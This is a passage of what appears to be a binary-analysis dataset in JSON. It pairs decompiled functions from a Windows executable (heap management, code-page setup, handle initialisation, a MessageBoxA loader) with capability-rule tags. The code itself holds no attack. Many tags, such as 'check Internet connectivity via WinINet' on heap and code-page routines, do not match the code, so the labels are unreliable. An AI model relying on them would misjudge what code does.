    puVar3 = puVar3 + 1;\n                        *unaff_ESI = *unaff_ESI + 1;\n                    }\n                    *in_ECX = *puVar3;\n                    in_ECX = in_ECX + 1;\n                }\n                *unaff_ESI = *unaff_ESI + 1;\n            }\n            puVar3 = puVar3 + 1;\n        }\n        if (in_ECX != NULL) {\n            *in_ECX = 0;\n            in_ECX = in_ECX + 1;\n        }\n        *unaff_ESI = *unaff_ESI + 1;\n    }\n    if (arg_8h != NULL) {\n        *arg_8h = NULL;\n    }\n    *arg_ch = *arg_ch + 1;\n    return;\n}\n",
        "token_count": 1212
    },
    "0040330a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0040330a(void)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint uVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    int32_t *piVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    uchar auStack68 [46];\n    int16_t iStack22;\n    int32_t *piStack20;\n    \n    puVar3 = fcn.004042a2(0x100);\n    if (puVar3 == NULL) {\n        uVar4 = 0xffffffff;\n    }\n    else {\n        *0x45e4a8 = 0x20;\n        *0x45e4c0 = puVar3;\n        for (; puVar3 < *0x45e4c0 + 0x40; puVar3 = puVar3 + 2) {\n            *puVar3 = 0xffffffff;\n            *(puVar3 + 1) = 0;\n            *(puVar3 + 5) = 10;\n        }\n        (*_sym.imp.KERNEL32.dll_GetStartupInfoA)(auStack68);\n        if ((iStack22 != 0) && (piStack20 != NULL)) {\n            iVar8 = *piStack20;\n            piStack20 = piStack20 + 1;\n            piVar7 = iVar8 + piStack20;\n            if (0x7ff < iVar8) {\n                iVar8 = 0x800;\n            }\n            iVar6 = iVar8;\n            if (*0x45e4a8 < iVar8) {\n                puVar3 = 0x45e4c4;\n                do {\n                    puVar5 = fcn.004042a2(0x100);\n                    iVar6 = *0x45e4a8;\n                    if (puVar5 == NULL) break;\n                    *0x45e4a8 = *0x45e4a8 + 0x20;\n                    *puVar3 = puVar5;\n                    puVar2 = puVar5;\n                    for (; puVar5 < puVar2 + 0x40; puVar5 = puVar5 + 2) {\n                        *puVar5 = 0xffffffff;\n                        *(puVar5 + 1) = 0;\n                        *(puVar5 + 5) = 10;\n                        puVar2 = *puVar3;\n                    }\n                    puVar3 = puVar3 + 1;\n                    iVar6 = iVar8;\n                } while (*0x45e4a8 < iVar8);\n            }\n            uVar9 = 0;\n            if (0 < iVar6) {\n                do {\n                    if (((*piVar7 != -1) && ((*piStack20 & 1) != 0)) &&\n                       (((*piStack20 & 8) != 0 || (iVar8 = (*_sym.imp.KERNEL32.dll_GetFileType)(*piVar7),  iVar8 != 0)))\n                       ) {\n                        piVar1 = *((uVar9 >> 5) * 4 + 0x45e4c0) + (uVar9 & 0x1f) * 8;\n                        *piVar1 = *piVar7;\n                        *(piVar1 + 1) = *piStack20;\n                    }\n                    uVar9 = uVar9 + 1;\n                    piStack20 = piStack20 + 1;\n                    piVar7 = piVar7 + 1;\n                } while (uVar9 < iVar6);\n            }\n        }\n        iVar8 = 0;\n        do {\n            piVar7 = *0x45e4c0 + iVar8 * 2;\n            if (*piVar7 == -1) {\n                *(piVar7 + 1) = 0x81;\n                if (iVar8 == 0) {\n                    iVar6 = -10;\n                }\n                else {\n                    iVar6 = -0xb - (iVar8 != 1);\n                }\n                iVar6 = (*_sym.imp.KERNEL32.dll_GetStdHandle)(iVar6);\n                if ((iVar6 != -1) && (uVar9 = (*_sym.imp.KERNEL32.dll_GetFileType)(iVar6),  uVar9 != 0)) {\n                    *piVar7 = iVar6;\n                    if ((uVar9 & 0xff) != 2) {\n                        if ((uVar9 & 0xff) == 3) {\n                            *(piVar7 + 1) = *(piVar7 + 1) | 8;\n                        }\n                        goto code_r0x0040349a;\n                    }\n                }\n                *(piVar7 + 1) = *(piVar7 + 1) | 0x40;\n            }\n            else {\n                *(piVar7 + 1) = *(piVar7 + 1) | 0x80;\n            }\ncode_r0x0040349a:\n            iVar8 = iVar8 + 1;\n        } while (iVar8 < 3);\n        (*_sym.imp.KERNEL32.dll_SetHandleCount)(*0x45e4a8);\n        uVar4 = 0;\n    }\n    return uVar4;\n}\n",
        "token_count": 1137
    },
    "00403560": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint fcn.00403560(void)\n\n{\n    if ((*0x45e058 == 2) && (4 < *0x45e064)) {\n        return 1;\n    }\n    return 3;\n}\n",
        "token_count": 48
    },
    "0040357a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint fcn.0040357a(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    *0x45e4a0 = (*_sym.imp.KERNEL32.dll_HeapCreate)(param_1 == 0, 0x1000, 0);\n    if (*0x45e4a0 == 0) {\n        return 0;\n    }\n    *0x45e4a4 = fcn.00403560();\n    if ((*0x45e4a4 == 3) && (iVar1 = fcn.004042c9(0x3f8),  iVar1 == 0)) {\n        (*_sym.imp.KERNEL32.dll_HeapDestroy)(*0x45e4a0);\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 177
    },
    "004038a9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004038a9(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = 0;\n    if (*0x45e1b4 == NULL) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"user32.dll\");\n        pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if ((iVar2 == 0) ||\n           (*0x45e1b4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"MessageBoxA\"),  *0x45e1b4 == NULL)) {\n            return 0;\n        }\n        *0x45e1b8 = (*pcVar1)(iVar2, \"GetActiveWindow\");\n        *0x45e1bc = (*pcVar1)(iVar2, \"GetLastActivePopup\");\n        if ((*0x45e058 == 2) && (*0x45e1c4 = (*pcVar1)(iVar2, \"GetUserObjectInformationA\"),  *0x45e1c4 != NULL)) {\n            *0x45e1c0 = (*pcVar1)(iVar2, \"GetProcessWindowStation\");\n        }\n    }\n    if ((*0x45e1c0 == NULL) ||\n       (((iVar2 = (**0x45e1c0)(),  iVar2 != 0 && (iVar2 = (**0x45e1c4)(iVar2, 1, &var_10h, 0xc, &var_4h),  iVar2 != 0))\n        && ((var_8h & 1) != 0)))) {\n        if (((*0x45e1b8 != NULL) && (iVar4 = (**0x45e1b8)(),  iVar4 != 0)) && (*0x45e1bc != NULL)) {\n            iVar4 = (**0x45e1bc)(iVar4);\n        }\n    }\n    else if (*0x45e064 < 4) {\n        arg_10h = arg_10h | 0x40000;\n    }\n    else {\n        arg_10h = arg_10h | 0x200000;\n    }\n    uVar3 = (**0x45e1b4)(iVar4, arg_8h, arg_ch, arg_10h);\n    return uVar3;\n}\n",
        "token_count": 580
    },
    "00403caa": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.00403caa(uint8_t param_1, uint32_t param_2, uint8_t param_3)\n\n{\n    if ((*(param_1 + 0x45e281) & param_3) == 0) {\n        if (param_2 == 0) {\n            param_2 = 0;\n        }\n        else {\n            param_2 = *(*0x425ca0 + param_1 * 2) & param_2;\n        }\n        if (param_2 == 0) {\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 131
    },
    "00403e58": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_518h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00403e58(void)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uchar uVar4;\n    char cVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint8_t *puVar8;\n    uint unaff_ESI;\n    uint *puVar9;\n    uint noname_8;\n    uint noname_9;\n    uint *noname_2;\n    uint noname_11;\n    uint *noname_4;\n    uint noname_13;\n    uint noname_14;\n    uint noname_15;\n    uint noname_8_00;\n    uint *noname_1;\n    uint noname_10;\n    uint noname_12;\n    uint noname_13_00;\n    uint noname_14_00;\n    uint noname_7;\n    uint *arg_8h;\n    uint var_518h;\n    uint in_stack_fffffae8;\n    uint in_stack_fffffaec;\n    uint in_stack_fffffaf0;\n    uint in_stack_fffffaf4;\n    uint in_stack_fffffaf8;\n    uint in_stack_fffffafc;\n    uint in_stack_fffffb00;\n    uint in_stack_fffffb04;\n    uint var_318h;\n    uint var_218h;\n    uint var_118h;\n    uint lpCPInfo;\n    uint var_12h;\n    uint var_4h;\n    \n    var_4h = *0x425b90;\n    arg_8h = &lpCPInfo;\n    noname_7 = *0x45e384;\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetCPInfo)();\n    if (iVar2 == 1) {\n        uVar3 = 0;\n        do {\n            *(&var_118h + uVar3) = uVar3;\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < 0x100);\n        var_118h._0_1_ = 0x20;\n        if (var_12h != 0) {\n            puVar8 = &var_12h + 1;\n            do {\n                uVar3 = var_12h;\n                if (uVar3 <= *puVar8) {\n                    uVar6 = (*puVar8 - uVar3) + 1;\n                    puVar9 = &var_118h + uVar3;\n                    for (uVar7 = uVar6 >> 2; uVar7 != 0; uVar7 = uVar7 - 1) {\n                        *puVar9 = 0x20202020;\n                        puVar9 = puVar9 + 1;\n                    }\n                    for (uVar6 = uVar6 & 3; uVar6 != 0; uVar6 = uVar6 - 1) {\n                        *puVar9 = 0x20;\n                        puVar9 = puVar9 + 1;\n                    }\n                }\n                var_12h._0_1_ = puVar8[1];\n                puVar8 = puVar8 + 2;\n            } while (var_12h != 0);\n        }\n        noname_14_00 = 0;\n        puVar9 = &var_518h;\n        noname_10 = 0x100;\n        noname_1 = &var_118h;\n        noname_8_00 = 1;\n        noname_12 = *0x45e384;\n        noname_13_00 = *0x45e270;\n        fcn.00405c93(1, noname_1, 0x100, puVar9, *0x45e384, *0x45e270, 0, noname_7, arg_8h, unaff_ESI, var_518h, \n                     in_stack_fffffae8, in_stack_fffffaec, in_stack_fffffaf0, in_stack_fffffaf4);\n        noname_15 = 0;\n        noname_4 = &var_218h;\n        noname_13 = 0x100;\n        noname_11 = 0x100;\n        noname_2 = &var_118h;\n        noname_9 = 0x100;\n        noname_8 = *0x45e270;\n        noname_14 = *0x45e384;\n        fcn.004058d7(*0x45e270, 0x100, noname_2, 0x100, noname_4, 0x100, *0x45e384, 0, noname_8_00, noname_1, noname_10\n                     , puVar9, noname_12, noname_13_00, noname_14_00, noname_7, arg_8h, unaff_ESI, var_518h, \n                     in_stack_fffffae8, in_stack_fffffaec, in_stack_fffffaf0, in_stack_fffffaf4, in_stack_fffffaf8, \n                     in_stack_fffffafc, in_stack_fffffb00, in_stack_fffffb04);\n        fcn.004058d7(*0x45e270, 0x200, &var_118h, 0x100, &var_318h, 0x100, *0x45e384, 0, noname_8, noname_9, noname_2, \n                     noname_11, noname_4, noname_13, noname_14, noname_15, noname_8_00, noname_1, noname_10, puVar9, \n                     noname_12, noname_13_00, noname_14_00, noname_7, arg_8h, unaff_ESI, var_518h);\n        uVar3 = 0;\n        do {\n            uVar1 = *(&var_518h + uVar3 * 2);\n            if ((uVar1 & 1) == 0) {\n                if ((uVar1 & 2) != 0) {\n                    *(uVar3 + 0x45e281) = *(uVar3 + 0x45e281) | 0x20;\n                    uVar4 = *(&var_318h + uVar3);\n                    goto code_r0x00403f6a;\n                }\n                *(uVar3 + 0x45e3a0) = 0;\n            }\n            else {\n                *(uVar3 + 0x45e281) = *(uVar3 + 0x45e281) | 0x10;\n                uVar4 = *(&var_218h + uVar3);\ncode_r0x00403f6a:\n                *(uVar3 + 0x45e3a0) = uVar4;\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < 0x100);\n    }\n    else {\n        uVar3 = 0;\n        do {\n            if ((uVar3 < 0x41) || (0x5a < uVar3)) {\n                if ((0x60 < uVar3) && (uVar3 < 0x7b)) {\n                    *(uVar3 + 0x45e281) = *(uVar3 + 0x45e281) | 0x20;\n                    cVar5 = uVar3 + -0x20;\n                    goto code_r0x00403fad;\n                }\n                *(uVar3 + 0x45e3a0) = 0;\n            }\n            else {\n                *(uVar3 + 0x45e281) = *(uVar3 + 0x45e281) | 0x10;\n                cVar5 = uVar3 + ' ';\ncode_r0x00403fad:\n                *(uVar3 + 0x45e3a0) = cVar5;\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < 0x100);\n    }\n    fcn.00403c9c();\n    return;\n}\n",
        "token_count": 1845
    },
    "00403fe4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403fe4(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t extraout_ECX;\n    int32_t iVar6;\n    uint8_t *puVar7;\n    uint8_t *puVar8;\n    uint *puVar9;\n    uint32_t var_1ch;\n    uint32_t lpCPInfo;\n    uint var_12h;\n    uint var_4h;\n    \n    var_4h = *0x425b90;\n    *0x45e1c8 = 0;\n    if (arg_8h == -2) {\n        *0x45e1c8 = 1;\n        arg_8h = (*_sym.imp.KERNEL32.dll_GetOEMCP)();\n    }\n    else if (arg_8h == -3) {\n        *0x45e1c8 = 1;\n        arg_8h = (*_sym.imp.KERNEL32.dll_GetACP)();\n    }\n    else if (arg_8h == -4) {\n        *0x45e1c8 = 1;\n        arg_8h = *0x45e238;\n    }\n    if (arg_8h == *0x45e384) goto code_r0x004041bd;\n    if (arg_8h != 0) {\n        iVar6 = 0;\n        uVar3 = 0;\ncode_r0x0040405f:\n        if (*(uVar3 + 0x425ba0) != arg_8h) goto code_r0x00404067;\n        puVar9 = 0x45e280;\n        for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n            *puVar9 = 0;\n            puVar9 = puVar9 + 1;\n        }\n        var_1ch = 0;\n        *puVar9 = 0;\n        puVar7 = iVar6 * 0x30 + 0x425bb0;\n        do {\n            uVar2 = *puVar7;\n            puVar8 = puVar7;\n            while ((uVar2 != 0 && (uVar1 = puVar8[1],  uVar1 != 0))) {\n                uVar3 = uVar2;\n                if (uVar3 <= uVar1) {\n                    uVar2 = *(var_1ch + 0x425b98);\n                    do {\n                        *(uVar3 + 0x45e281) = *(uVar3 + 0x45e281) | uVar2;\n                        uVar3 = uVar3 + 1;\n                    } while (uVar3 <= uVar1);\n                }\n                puVar8 = puVar8 + 2;\n                uVar2 = *puVar8;\n            }\n            var_1ch = var_1ch + 1;\n            puVar7 = puVar7 + 8;\n        } while (var_1ch < 4);\n        *0x45e384 = arg_8h;\n        *0x45e274 = 1;\n        *0x45e270 = fcn.00403e00();\n        *0x45e390 = *(extraout_ECX + 0x425ba4);\n        *0x45e394 = *(extraout_ECX + 0x425ba8);\n        *0x45e398 = *(extraout_ECX + 0x425bac);\n        goto code_r0x004041b1;\n    }\ncode_r0x004041ac:\n    fcn.00403e2f();\ncode_r0x004041b1:\n    fcn.00403e58();\ncode_r0x004041bd:\n    fcn.00403c9c();\n    return;\ncode_r0x00404067:\n    uVar3 = uVar3 + 0x30;\n    iVar6 = iVar6 + 1;\n    if (0xef < uVar3) goto code_r0x00404072;\n    goto code_r0x0040405f;\ncode_r0x00404072:\n    iVar6 = (*_sym.imp.KERNEL32.dll_GetCPInfo)(arg_8h, &lpCPInfo);\n    if (iVar6 != 1) {\n        if (*0x45e1c8 == 0) goto code_r0x004041bd;\n        goto code_r0x004041ac;\n    }\n    puVar9 = 0x45e280;\n    for (iVar6 = 0x40; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    *puVar9 = 0;\n    uVar3 = 1;\n    *0x45e270 = 0;\n    *0x45e384 = arg_8h;\n    if (lpCPInfo < 2) {\n        *0x45e274 = 0;\n    }\n    else {\n        if (var_12h != '\\0') {\n            puVar7 = &var_12h + 1;\n            do {\n                uVar2 = *puVar7;\n                if (uVar2 == 0) break;\n                for (uVar4 = puVar7[-1]; uVar4 <= uVar2; uVar4 = uVar4 + 1) {\n                    *(uVar4 + 0x45e281) = *(uVar4 + 0x45e281) | 4;\n                }\n                puVar8 = puVar7 + 1;\n                puVar7 = puVar7 + 2;\n            } while (*puVar8 != 0);\n        }\n        do {\n            *(uVar3 + 0x45e281) = *(uVar3 + 0x45e281) | 8;\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < 0xff);\n        *0x45e270 = fcn.00403e00();\n        *0x45e274 = 1;\n    }\n    *0x45e390 = 0;\n    *0x45e394 = 0;\n    *0x45e398 = 0;\n    goto code_r0x004041b1;\n}\n",
        "token_count": 1419
    },
    "004041f8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid fcn.004041f8(int32_t param_1)\n\n{\n    int32_t arg_8h;\n    \n    if (param_1 != 0) {\n        if (*0x45e4a4 == 3) {\n            arg_8h = fcn.00404311(param_1);\n            if (arg_8h != 0) {\n                fcn.0040433c(arg_8h, param_1);\n                return;\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_HeapFree)(*0x45e4a0, 0);\n    }\n    return;\n}\n",
        "token_count": 135
    },
    "00404230": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid fcn.00404230(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    if (((*0x45e4a4 == 3) && (param_1 <= *0x45e260)) && (iVar1 = fcn.00404f35(param_1),  iVar1 != 0)) {\n        return;\n    }\n    if (param_1 == 0) {\n        param_1 = 1;\n    }\n    if (*0x45e4a4 != 1) {\n        param_1 = param_1 + 0xf & 0xfffffff0;\n    }\n    (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x45e4a0, 0, param_1);\n    return;\n}\n",
        "token_count": 170
    },
    "0040433c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040433c(uint32_t *arg_8h, int32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    char *pcVar2;\n    uint32_t *puVar3;\n    int32_t *piVar4;\n    char cVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    code *pcVar8;\n    uint8_t uVar9;\n    uint32_t uVar10;\n    uint32_t *puVar11;\n    uint32_t *puVar12;\n    uint32_t *puVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    uVar6 = arg_8h[4];\n    puVar13 = arg_ch + -4;\n    uVar15 = arg_ch - arg_8h[3] >> 0xf;\n    piVar4 = uVar15 * 0x204 + 0x144 + uVar6;\n    var_4h = *puVar13 - 1;\n    if ((var_4h & 1) == 0) {\n        puVar11 = var_4h + puVar13;\n        uVar14 = *puVar11;\n        uVar7 = *(arg_ch + -8);\n        if ((uVar14 & 1) == 0) {\n            uVar10 = (uVar14 >> 4) - 1;\n            if (0x3f < uVar10) {\n                uVar10 = 0x3f;\n            }\n            if (puVar11[1] == puVar11[2]) {\n                if (uVar10 < 0x20) {\n                    pcVar2 = uVar10 + 4 + uVar6;\n                    uVar10 = ~(0x80000000U >> (uVar10 & 0x1f));\n                    puVar12 = uVar6 + 0x44 + uVar15 * 4;\n                    *puVar12 = *puVar12 & uVar10;\n                    *pcVar2 = *pcVar2 + -1;\n                    if (*pcVar2 == '\\0') {\n                        *arg_8h = *arg_8h & uVar10;\n                    }\n                }\n                else {\n                    pcVar2 = uVar10 + 4 + uVar6;\n                    uVar10 = ~(0x80000000U >> (uVar10 - 0x20 & 0x1f));\n                    puVar12 = uVar6 + 0xc4 + uVar15 * 4;\n                    *puVar12 = *puVar12 & uVar10;\n                    *pcVar2 = *pcVar2 + -1;\n                    if (*pcVar2 == '\\0') {\n                        arg_8h[1] = arg_8h[1] & uVar10;\n                    }\n                }\n            }\n            var_4h = var_4h + uVar14;\n            *(puVar11[2] + 4) = puVar11[1];\n            *(puVar11[1] + 8) = puVar11[2];\n        }\n        puVar11 = (var_4h >> 4) + -1;\n        if (0x3f < puVar11) {\n            puVar11 = 0x3f;\n        }\n        puVar12 = arg_8h;\n        if ((uVar7 & 1) == 0) {\n            puVar13 = puVar13 - uVar7;\n            puVar12 = (uVar7 >> 4) + -1;\n            if (0x3f < puVar12) {\n                puVar12 = 0x3f;\n            }\n            var_4h = var_4h + uVar7;\n            puVar11 = (var_4h >> 4) + -1;\n            if (0x3f < puVar11) {\n                puVar11 = 0x3f;\n            }\n            if (puVar12 != puVar11) {\n                if (puVar13[1] == puVar13[2]) {\n                    if (puVar12 < 0x20) {\n                        uVar14 = ~(0x80000000U >> (puVar12 & 0x1f));\n                        puVar3 = uVar6 + 0x44 + uVar15 * 4;\n                        *puVar3 = *puVar3 & uVar14;\n                        pcVar2 = puVar12 + uVar6 + 4;\n                        *pcVar2 = *pcVar2 + -1;\n                        if (*pcVar2 == '\\0') {\n                            *arg_8h = *arg_8h & uVar14;\n                        }\n                    }\n                    else {\n                        uVar14 = ~(0x80000000U >> (puVar12 - 0x20 & 0x1f));\n                        puVar3 = uVar6 + 0xc4 + uVar15 * 4;\n                        *puVar3 = *puVar3 & uVar14;\n                        pcVar2 = puVar12 + uVar6 + 4;\n                        *pcVar2 = *pcVar2 + -1;\n                        if (*pcVar2 == '\\0') {\n                            arg_8h[1] = arg_8h[1] & uVar14;\n                        }\n                    }\n                }\n                *(puVar13[2] + 4) = puVar13[1];\n                *(puVar13[1] + 8) = puVar13[2];\n            }\n        }\n        if (((uVar7 & 1) != 0) || (puVar12 != puVar11)) {\n            piVar1 = piVar4 + puVar11 * 2;\n            uVar14 = piVar1[1];\n            puVar13[2] = piVar1;\n            puVar13[1] = uVar14;\n            piVar1[1] = puVar13;\n            *(puVar13[1] + 8) = puVar13;\n            if (puVar13[1] == puVar13[2]) {\n                cVar5 = *(puVar11 + uVar6 + 4);\n                *(puVar11 + uVar6 + 4) = cVar5 + '\\x01';\n                uVar9 = puVar11;\n                if (puVar11 < 0x20) {\n                    if (cVar5 == '\\0') {\n                        *arg_8h = *arg_8h | 0x80000000U >> (uVar9 & 0x1f);\n                    }\n                    puVar11 = uVar6 + 0x44 + uVar15 * 4;\n                    *puVar11 = *puVar11 | 0x80000000U >> (uVar9 & 0x1f);\n                }\n                else {\n                    if (cVar5 == '\\0') {\n                        arg_8h[1] = arg_8h[1] | 0x80000000U >> (uVar9 - 0x20 & 0x1f);\n                    }\n                    puVar11 = uVar6 + 0xc4 + uVar15 * 4;\n                    *puVar11 = *puVar11 | 0x80000000U >> (uVar9 - 0x20 & 0x1f);\n                }\n            }\n        }\n        *puVar13 = var_4h;\n        *((var_4h - 4) + puVar13) = var_4h;\n        *piVar4 = *piVar4 + -1;\n        pcVar8 = _sym.imp.KERNEL32.dll_VirtualFree;\n        if (*piVar4 == 0) {\n            if (*0x45e254 != NULL) {\n                (*_sym.imp.KERNEL32.dll_VirtualFree)(*0x45e26c * 0x8000 + (*0x45e254)[3], 0x8000, 0x4000);\n                (*0x45e254)[2] = (*0x45e254)[2] | 0x80000000U >> (*0x45e26c & 0x1f);\n                *((*0x45e254)[4] + 0xc4 + *0x45e26c * 4) = 0;\n                *((*0x45e254)[4] + 0x43) = *((*0x45e254)[4] + 0x43) + -1;\n                if (*((*0x45e254)[4] + 0x43) == '\\0') {\n                    (*0x45e254)[1] = (*0x45e254)[1] & 0xfffffffe;\n                }\n                if ((*0x45e254)[2] == 0xffffffff) {\n                    (*pcVar8)((*0x45e254)[3], 0, 0x8000);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(*0x45e4a0, 0, (*0x45e254)[4]);\n                    fcn.00405e80(*0x45e254, *0x45e254 + 5, (*0x45e258 * 0x14 - *0x45e254) + -0x14 + *0x45e25c);\n                    *0x45e258 = *0x45e258 + -1;\n                    if (*0x45e254 < arg_8h) {\n                        arg_8h = arg_8h + -5;\n                    }\n                    *0x45e264 = *0x45e25c;\n                }\n            }\n            *0x45e254 = arg_8h;\n            *0x45e26c = uVar15;\n        }\n    }\n    return;\n}\n",
        "token_count": 2168
    },
    "00404bc1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.00404bc1(void)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t **ppiVar4;\n    uint32_t uVar5;\n    int32_t *piVar6;\n    int32_t **ppiVar7;\n    int32_t iVar8;\n    int32_t **ppiVar9;\n    int32_t **ppiVar10;\n    uint32_t *puVar11;\n    uint32_t *puVar12;\n    uint *puVar13;\n    bool bVar14;\n    uint var_138h;\n    uint32_t *var_38h;\n    uint32_t *var_34h;\n    int32_t **var_30h;\n    int32_t **var_2ch;\n    uint32_t var_28h;\n    int32_t **var_24h;\n    uint32_t var_20h;\n    int32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    int32_t **var_8h;\n    int32_t *var_4h;\n    \n    iVar3 = (*_sym.imp.KERNEL32.dll_IsBadWritePtr)(*0x45e25c, *0x45e258 * 0x14);\n    if (iVar3 != 0) {\n        return 0xffffffff;\n    }\n    var_1ch = 0;\n    puVar11 = *0x45e25c;\n    if (0 < *0x45e258) {\n        do {\n            uVar5 = puVar11[4];\n            var_34h = puVar11;\n            iVar3 = (*_sym.imp.KERNEL32.dll_IsBadWritePtr)(uVar5, 0x41c4);\n            if (iVar3 != 0) {\n                return 0xfffffffe;\n            }\n            var_8h = puVar11[3];\n            var_24h = uVar5 + 0x144;\n            var_20h = puVar11[2];\n            puVar12 = uVar5 + 0xc4;\n            var_10h = 0;\n            var_14h = 0;\n            var_ch = 0;\n            do {\n                var_28h = 0;\n                var_18h = 0;\n                var_4h = NULL;\n                bVar14 = -1 < var_20h;\n                puVar13 = &var_138h;\n                var_38h = puVar12;\n                for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar13 = 0;\n                    puVar13 = puVar13 + 1;\n                }\n                if (bVar14) {\n                    iVar3 = (*_sym.imp.KERNEL32.dll_IsBadWritePtr)(var_8h, 0x8000);\n                    if (iVar3 != 0) {\n                        return 0xfffffffc;\n                    }\n                    iVar3 = 0;\n                    ppiVar9 = var_8h + 0x3ff;\n                    do {\n                        ppiVar4 = ppiVar9 + -0x3fc;\n                        if ((ppiVar9[-0x3fd] != 0xffffffff) || (*ppiVar9 != 0xffffffff)) {\n                            return 0xfffffffb;\n                        }\n                        do {\n                            piVar2 = *ppiVar4;\n                            if ((piVar2 & 1) == 0) {\n                                iVar8 = (piVar2 >> 4) + -1;\n                                if (0x3f < iVar8) {\n                                    iVar8 = 0x3f;\n                                }\n                                (&var_138h)[iVar8] = (&var_138h)[iVar8] + 1;\n                                piVar6 = piVar2;\n                            }\n                            else {\n                                if (0x400 < piVar2 - 1U) {\n                                    return 0xfffffffa;\n                                }\n                                var_4h = var_4h + 1;\n                                piVar6 = piVar2 - 1U;\n                            }\n                            if (((piVar6 < 0x10) || ((piVar6 & 0xf) != 0)) || (0xff0 < piVar6)) {\n                                return 0xfffffff9;\n                            }\n                            ppiVar4 = piVar6 + ppiVar4;\n                            if (ppiVar4[-1] != piVar2) {\n                                return 0xfffffff8;\n                            }\n                        } while (ppiVar4 < ppiVar9);\n                        if (ppiVar4 != ppiVar9) {\n                            return 0xfffffff8;\n                        }\n                        ppiVar9 = ppiVar9 + 0x400;\n                        iVar3 = iVar3 + 1;\n                    } while (iVar3 < 8);\n                    if (*var_24h != var_4h) {\n                        return 